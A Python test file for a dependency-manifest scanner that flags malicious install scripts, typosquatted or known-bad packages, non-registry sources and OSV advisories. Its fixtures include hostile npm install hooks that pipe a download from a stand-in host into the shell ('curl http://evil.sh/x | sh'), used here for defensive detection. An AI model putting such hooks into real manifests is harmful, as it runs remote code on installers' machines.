"""Dependency-manifest supply-chain scan: dep_guard detector + /api/scan/deps."""

from __future__ import annotations

import json

from app.detectors import dep_guard
from app.detectors.base import AnalysisInput, Category, Surface


def _scan(content, subject="package.json"):
    return dep_guard.DepGuardDetector().analyze(
        AnalysisInput(content=content, subject=subject, surface=Surface.DEPS))


def _cats(sigs):
    return {s.category for s in sigs}


def test_malicious_install_script():
    pkg = json.dumps({"name": "x", "scripts": {
        "postinstall": "curl http://evil.sh/x | sh"}})
    sigs = _scan(pkg)
    assert Category.DEPENDENCY_RISK in _cats(sigs)
    assert any("install script" in s.title.lower() for s in sigs)


def test_non_registry_source_package_json():
    pkg = json.dumps({"dependencies": {"good": "^1.0.0", "sketchy": "git+https://x.dev/a.git"}})
    sigs = _scan(pkg)
    assert any("non-registry" in s.title.lower() for s in sigs)


def test_known_bad_package():
    pkg = json.dumps({"dependencies": {"crossenv": "1.0.0"}})
    sigs = _scan(pkg)
    assert any("known-bad" in s.title.lower() for s in sigs)


def test_requirements_txt():
    reqs = "requests==2.31.0\ncolourama==0.1\n-e git+https://x/y.git#egg=z\n"
    sigs = _scan(reqs, subject="requirements.txt")
    titles = " ".join(s.title.lower() for s in sigs)
    assert "known-bad" in titles          # colourama (typosquat of colorama)
    assert "non-registry" in titles       # the -e git+ line


def test_clean_manifest():
    pkg = json.dumps({"name": "app", "dependencies": {"react": "^18.3.1", "vite": "^6.0.0"},
                      "scripts": {"build": "vite build", "test": "vitest"}})
    assert _scan(pkg) == []


def test_extract_pinned():
    from app.detectors.dep_guard import extract_pinned
    npm = extract_pinned('{"dependencies":{"a":"1.2.3","b":"^2.0.0"}}', "package.json")
    assert ("npm", "a", "1.2.3") in npm and all(n != "b" for _e, n, _v in npm)   # range skipped
    py = extract_pinned("django==3.2.1\nflask>=2\n# c\n", "requirements.txt")
    assert ("PyPI", "django", "3.2.1") in py and all(n != "flask" for _e, n, _v in py)


def test_osv_advisory_flagged(client, raw_client, monkeypatch):
    import app.main as main
    import app.osv as osv
    monkeypatch.setattr(main.settings, "dep_osv_enabled", True)
    monkeypatch.setattr(osv, "query",
                        lambda pins: {("PyPI", "django", "1.0"): ["GHSA-xxxx", "CVE-2020-0001"]})
    key = client.post("/api/apikeys", json={"label": "osv", "actor": "ci@acme.com"}).json()["token"]
    r = raw_client.post("/api/scan/deps", headers={"X-Warden-Token": key}, json={"files": [
        {"path": "requirements.txt", "content": "django==1.0\nrequests==2.31.0"}]})
    body = r.json()
    assert body["action"] == "block"
    titles = [s["title"] for f in body["files"] for s in f["signals"]]
    assert any("OSV" in t for t in titles)


def test_osv_disabled_by_default(client, raw_client, monkeypatch):
    # With OSV off, no network call happens (query would raise if invoked here).
    import app.osv as osv
    def _boom(_pins):
        raise AssertionError("OSV should not be queried when disabled")
    monkeypatch.setattr(osv, "query", _boom)
    key = client.post("/api/apikeys", json={"label": "osv2", "actor": "ci@acme.com"}).json()["token"]
    r = raw_client.post("/api/scan/deps", headers={"X-Warden-Token": key}, json={"files": [
        {"path": "requirements.txt", "content": "django==1.0"}]})
    assert r.status_code == 200


def test_scan_deps_endpoint(client, raw_client):
    key = client.post("/api/apikeys", json={"label": "deps", "actor": "ci@acme.com"}).json()["token"]
    r = raw_client.post("/api/scan/deps", headers={"X-Warden-Token": key}, json={"files": [
        {"path": "package.json", "content": json.dumps({"scripts": {"preinstall": "curl http://e|sh"}})},
        {"path": "clean.json", "content": json.dumps({"dependencies": {"react": "^18"}})},
    ]})
    body = r.json()
    assert body["action"] in ("warn", "block")
    flagged = {f["path"] for f in body["files"]}
    assert "package.json" in flagged and "clean.json" not in flagged
